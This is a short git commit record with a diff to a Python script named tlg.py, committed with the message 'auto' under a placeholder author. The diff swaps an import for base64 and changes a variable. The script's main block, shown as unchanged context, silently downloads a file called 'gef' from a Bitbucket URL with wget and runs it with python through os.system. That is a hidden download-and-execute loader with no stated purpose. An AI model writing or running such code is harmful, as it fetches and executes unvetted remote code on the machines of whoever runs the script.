4e90fdc45f585e87b60c605306811c469ae68a90
Your Name <you@example.com>
2024-11-02 03:52:34 +0100

    auto

--- tlg.py
+++ tlg.py
@@ -1,4 +1,4 @@
-import sys,os,optparse
-t=21
+import sys,os,base64
+m=3
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
